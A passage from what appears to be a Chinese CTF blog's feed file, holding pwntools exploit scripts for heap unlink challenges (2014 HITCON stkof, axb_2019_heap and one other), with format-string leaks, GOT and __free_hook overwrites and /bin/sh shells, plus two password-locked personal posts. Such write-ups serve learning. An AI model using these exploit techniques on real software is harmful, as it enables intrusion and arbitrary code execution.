class="line"></span><br><span class="line">s=p.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">chunk2=u64(s[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">heap_addr=chunk2-<span class="number">0x1940</span></span><br><span class="line"></span><br><span class="line">point_chunk0=heap_addr+<span class="number">0x30</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#unlink</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x90</span>)+p64(<span class="number">0x81</span>)+p64(point_chunk0-<span class="number">0x18</span>)+p64(point_chunk0-<span class="number">0x10</span>) </span><br><span class="line"></span><br><span class="line">payload +=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">payload +=<span class="string">&#x27;c&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0x90</span>)+p64(<span class="number">0x121</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#free_got-&gt;system</span></span><br><span class="line"></span><br><span class="line">free_got_addr=e.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(free_got_addr)</span><br><span class="line"></span><br><span class="line">payload2=p64(<span class="number">4</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(free_got_addr)</span><br><span class="line"></span><br><span class="line">payload2+=p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(chunk2)</span><br><span class="line"></span><br><span class="line">payload2+=p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(e.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload2+=<span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x120</span>-<span class="number">80</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Your choice: Invalid!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">List</span>()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;2. &#x27;</span>)</span><br><span class="line"></span><br><span class="line">atoi_in_server=u64(p.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">system_in_server=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+atoi_in_server-libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(proc.pidof(p)[0])</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload3=p64(system_in_server)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload3)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201132341535.png" alt="image-20220113234153456"></p><h3 id="0x04-参考文章"><a class="markdownIt-Anchor" href="#0x04-参考文章">#</a> 0x04 参考文章</h3><p><a href="https://blog.csdn.net/weixin_45427676/article/details/105495608">https://blog.csdn.net/weixin_45427676/article/details/105495608</a></p><p><a href="https://www.cnblogs.com/LynneHuan/p/14869403.html">https://www.cnblogs.com/LynneHuan/p/14869403.html</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>To kk</title>
      <link href="/2022/01/02/To%20kk/"/>
      <url>/2022/01/02/To%20kk/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Sorry incorrect password" data-whm="抱歉，信息无法验证">  <script id="hbeData" type="hbeData" data-hmacdigest="ccca89da6777ddbe0c1489f55b8115496c89effeafc10ea68b0a2c12706f9fb5">a6d9ea9da8fc05ccc8d1164b3233fcb96eadc174fe335a7406937ef7072c444d697324cba0e37b9b8446977dff318bb0db8606b3edf6b8d0daa86a2631e54543dbf7440acc018a572a5805e41c0a5aec4e9024ae5c9494b297378fd0133293fec6f8fc387b255223def0e791912688c260471b0946570bb6f261b14a00b094e5ea0523ef7c4b049ef6652ec40e5e53703ba34bffad512cca69fdafbe61f6ae9db60bb0d77fe918acfc319a96214a6c221fa88c0012d7a9f8b6296dbce5c377d800c4c6d93e51fa2e15e8b28d45c26481b410a350aab4b45324f655bf0b638e15095bcbd036fb30406c7bb75c32da536a19cb5150d848fac97f4e24ab1bd165a207553b4f8983eda5e5e25ff6ef22e603b0f602fec1b54e9411d91a299b03eca1d90fe8fff28985965c90b34582265955e2ed38d2cb88f362e9b69ff2734f59ec530b56556232f4b7a26fe4b335d5096d654f8700dc273a74a0124a9eeb6bbfbf20774776ab88f3cdc03aeed95d4a3ede5e343b7aa206c3f08924191a6955f65ef3f7ac9ad32a038870855ca3c7acfa717698093fa35eb0a93a88dc795447ef7282b7560dec5419127d3e1f2230de8805c2b9b5847f6e2712ab1f4e303b5c754a284c972c9c6aad70015f05005cb157c773e8a25eb5877a630facd3857fb00400794702a6feae82fd2499981faf2e0b73d2a3c72989d93f03ddd0a1b85c3a02edb8d2595af4c2c55da9390784bb142ba341ff3fe4ff7041879a50324ce55098ce9be4590eb54348371ce0d216e6c360dcfe0915d03b7c30b96d2a220cad4e03e5d87e657d88111dbfd8c7431be8d704b05db3f97555afe5c34d8fd5cc31c3e171b74a9367ecf20f9653435d1e6d69389db1eae1b5d847d15f3cbb34df3b3ea893e1d8c03cc374ebbb90b2ff30dae7a08255785533da4cf8aa90a70ee4e22017919de0e7ea05e25b7e8e30aa33a72b4d42fa3121b4dd7a79e241e42c8aeac1cd098a75a75b0cbca649d39d03a38d4b67b5bbe9b993cb540f3bf5f4772b69c04a2792fff2f415aceb6bf269d5fabd6814d77894dd70eb8f8bd04e3098214d503ad9c75f54ab1458dde8c1b0e6aba744802b7d9d7ab9e86da0408dc0231f00b744e7c162e139bbca0d12ab6d3cec4cbe97e886477dfd5d9b1846bf8ff7795c30d6ea46d41a68eb05cf8e65feabb9e177becd2b81fade2e26eb88d9338228f76f7e45e8355e9e1bfd6929c4d66594681b0aae60f5a82527043dc5b8a6ecf2975c60528ea683ab8481a720f5d5ac5414cebd97d6d31177f398c4db556e045ffd961d9f6d31db8a71cc0c0fa31ec1f0b7ea5dc4bd7038c55e4287ab6655760e6b2200c6c73c4fe9508555e6b763479b7bcfb0386bdaf8ba20a347d90e1095aa443d20c12a68867eca1d94ca5a5422b317cfab797432fe3186ee76ecf953c638801585f3ae222da1f0232ab4171c8566695d74a4dcc575dfc96769ef870eea1b310844e7b80a626985b7cf503076bbf1eabf8807ed94163702f0327b5e232d4ab96c6d0664738e0b1e9c0a796d4e16c3a29ab3e2c322c10ba4f100fca47eea33e77dae5604ffbcb82c43737ca88a4f574ea9f0709d6d58d1be722243540f50219b7d9db9c38656a69a87a90ef1f68bc545a7f7f8ba7bbb265bb2daf77b65e53d7d9b9e90a273beecddbe2f2776d14871cd2adb8e0c8ee94d6694d29b60a7e529d9a0b2b26d597a42c965910ff06b620cea879251447d78314829c908bb75645f26e4b8a460f291afba15a4b9d6b6771d69c6d9180054844aaf077824e408b19cc66b8c0eaa55077da66d2ee7f5982ce88bfed0e677e20d3799973c7f9dea793f43bdce40bdb8ba96415c2fbf0c324185de0723dd14239b5636464ed93d4374d3840c2c67e1697495c0fff1cbacd5c8de085b08e8e9cc0f925f32b8d6242ae076aa602135e1a1798d7a6fd396b844f4b82b275c6ec9a23791db9e2acca00dce7e80105255b0a337c4ab25b50b101b2761a27cd15a40ad547730bfd23cdb526095c76e0d87a103b8d5256a0038cf48aa6b12b4a0c2afeb8fff007532511d7bb04e8ab721d45ff7e3deab6b4ec1990162d35babfd605b17a4b90f4f413e68bd0e72a184c36147bbb127c1a2932664a5a09cad7cbeee6d7d181813702b1665daa9de7662ad9a504a7ecea6333a53d152f18b8ededb4e6bfa8914d2c58cd69dad17bf3e88182c3cc9785ae706e68f2775e3b0f95bf4a56a1bd7ea02e06c2b22072faf82bd34ab0f08470737d7a5adbc6e5360799e165e378c0ff8921761e1e0101b88aa9ff2af0b623b465ea082ad9dcd134737005fceb63d352927d7b6f4f253b9ac3b41e82842464f4bda5751ac90494b2decd2f97c7df2c1e29b1f5d8668913a3d1b9b8775a04d5d3a81a2bf9b9ee5a758f06196759b1385d03831df3cc834d25001fc66f9a36cd9c89bbe4dd2954c42a69281182f71d574f3f29ba9b68f6905b63a0a1505315528582738b20c4627c056a59a4f74d8bb15785abbab589d9da4305d103f5dbb45cc7ece3f043b872490f9e0130a01d5015c090dd72c96971b422c4ba85443bd28449b8d5f3f526a2cb40b83d86f905296327b387e89635d7e1fd9ac75914520965d1d3f26b99d47a5913c054391a9652bb3d27db0666ec2ddd1be66e5274ae05ea37b315080ce921cf962b9d8419bde60dcabcf84608ff14db390a383ec8364dfcbff6b7da98797805f8540f4935d3e1d7e149cf3fc46f6b0d4f7ef7529570394343d527ae1591af2b704cf8d4368af95249f7c453df1e7a7a8aa1857a1aff0565870c3f74eed05026a9cd6d4e567ab0f547e23cb2fee7dcb3da11507f978</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Pease input your password</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Diaries</title>
      <link href="/2021/12/26/diary/"/>
      <url>/2021/12/26/diary/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Sorry incorrect password" data-whm="抱歉，信息无法验证">  <script id="hbeData" type="hbeData" data-hmacdigest="b7ec9bc5089164fa7c734e7e50c4ab309cae437383ff6be790dc1ea7517b8213"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Pease input your password</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unlink</title>
      <link href="/2021/11/25/unlink/"/>
      <url>/2021/11/25/unlink/</url>
      
        <content type="html"><![CDATA[<p>堆溢出漏洞 ——unlink</p><span id="more"></span><blockquote><p><a href="https://blog.csdn.net/qq_41202237/article/details/108481889?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163038712516780265472330%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163038712516780265472330&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-108481889.first_rank_v2_pc_rank_v29&amp;utm_term=hollk%20unlink&amp;spm=1018.2226.3001.4187">推荐 unlink 基本知识讲解</a></p></blockquote><h2 id="2014-hitcon-stkof"><a class="markdownIt-Anchor" href="#2014-hitcon-stkof">#</a> <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof">2014 HITCON stkof</a></h2><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.binary = <span class="string">&quot;./stkof&quot;</span></span><br><span class="line">hollkelf = ELF(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    hollk = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">7777</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    hollk = process(<span class="string">&quot;./stkof&quot;</span>)</span><br><span class="line">log.info(<span class="string">&#x27;PID: &#x27;</span> + <span class="built_in">str</span>(proc.pidof(hollk)[<span class="number">0</span>]))</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">head = <span class="number">0x602140</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    hollk.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    hollk.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    hollk.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    hollk.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    hollk.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    hollk.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    hollk.send(content)</span><br><span class="line">    hollk.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    hollk.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    hollk.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># trigger to malloc buffer for io function</span></span><br><span class="line">    alloc(<span class="number">0x100</span>)  <span class="comment"># idx 1</span></span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">0x30</span>)  <span class="comment"># idx 2</span></span><br><span class="line">    <span class="comment"># small chunk size inorder to trigger unlink</span></span><br><span class="line">    alloc(<span class="number">0x80</span>)  <span class="comment"># idx 3</span></span><br><span class="line">    <span class="comment"># a fake chunk at global[2]=head+16 who&#x27;s size is 0x20</span></span><br><span class="line">    payload = p64(<span class="number">0</span>)  <span class="comment">#prev_size</span></span><br><span class="line">    payload += p64(<span class="number">0x20</span>)  <span class="comment">#size</span></span><br><span class="line">    payload += p64(head - <span class="number">0x8</span>)  <span class="comment">#fd</span></span><br><span class="line">    payload += p64(head)  <span class="comment">#bk</span></span><br><span class="line">    payload += p64(<span class="number">0x20</span>)  <span class="comment"># next chunk&#x27;s prev_size bypass the check</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="comment"># overwrite global[3]&#x27;s chunk&#x27;s prev_size</span></span><br><span class="line">    <span class="comment"># make it believe that prev chunk is at global[2]</span></span><br><span class="line">    payload += p64(<span class="number">0x30</span>)</span><br><span class="line">    <span class="comment"># make it believe that prev chunk is free</span></span><br><span class="line">    payload += p64(<span class="number">0x90</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">    <span class="comment"># unlink fake chunk, so global[2] =&amp;(global[2])-0x18=head-8</span></span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    hollk.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(hollk)</span></span><br><span class="line">    <span class="comment"># overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(hollkelf.got[<span class="string">&#x27;free&#x27;</span>]) + p64(hollkelf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(</span><br><span class="line">        hollkelf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">    edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">    <span class="comment"># edit free@got to puts@plt</span></span><br><span class="line">    payload = p64(hollkelf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">    edit(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#free global[1] to leak puts addr</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    puts_addr = hollk.recvuntil(<span class="string">&#x27;\nOK\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    puts_addr = u64(puts_addr)</span><br><span class="line">    log.success(<span class="string">&#x27;puts addr: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    log.success(<span class="string">&#x27;/bin/sh addr: &#x27;</span> + <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">    log.success(<span class="string">&#x27;system addr: &#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">    <span class="comment"># modify atoi@got to system addr</span></span><br><span class="line">    payload = p64(system_addr)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">    hollk.send(p64(binsh_addr))</span><br><span class="line">    hollk.interactive()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="axb_2019_heap"><a class="markdownIt-Anchor" href="#axb_2019_heap">#</a> axb_2019_heap</h2><h3 id="知识点"><a class="markdownIt-Anchor" href="#知识点">#</a> 知识点</h3><ol><li><p>pwndbg 使用 regs 查看寄存器里得值</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111242245670.png" alt="image-20211124224540522"></p></li><li><p>利用思路</p><ul><li>利用格式化字符串泄露 libc 和程序基址</li><li>运用 unlink 将 chunk 0 地址覆写为 free_hook 的地址</li><li>将 system 地址写入 free_hook</li><li>触发写入的’/bin/sh’块的删除，执行 system (’/bin/sh’)</li></ul></li></ol><h2 id="wp"><a class="markdownIt-Anchor" href="#wp">#</a> WP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&quot;node3.buuoj.cn&quot;,26144)</span></span><br><span class="line">p = process(<span class="string">&quot;./axb_2019_heap&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./axb_2019_heap&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23-64.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;):&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;content:&#x27;</span>,content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;content: \n&#x27;</span>,content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;name: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;%11$p%15$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello, &#x27;</span>)</span><br><span class="line">base=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x1186</span></span><br><span class="line"><span class="comment">#success(&quot;base:&quot;+hex(base))</span></span><br><span class="line">libcbase=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">240</span></span><br><span class="line">system=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook=libcbase+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">bss=base+<span class="number">0x202060</span></span><br><span class="line">success(<span class="string">&quot;bss:&quot;</span>+<span class="built_in">hex</span>(bss))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x98</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x98</span>,<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x90</span>,<span class="string">&#x27;cccc&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x90</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#3</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"> </span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(bss-<span class="number">0x18</span>)+p64(bss-<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">14</span>+p64(<span class="number">0x90</span>)+<span class="string">&#x27;\xa0&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(free_hook)+p64(<span class="number">0x10</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(system))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.tw orw</title>
      <link href="/2021/11/17/pwnable.tw_orw/"/>
      <url>/2021/11/17/pwnable.tw_orw/</url>
      
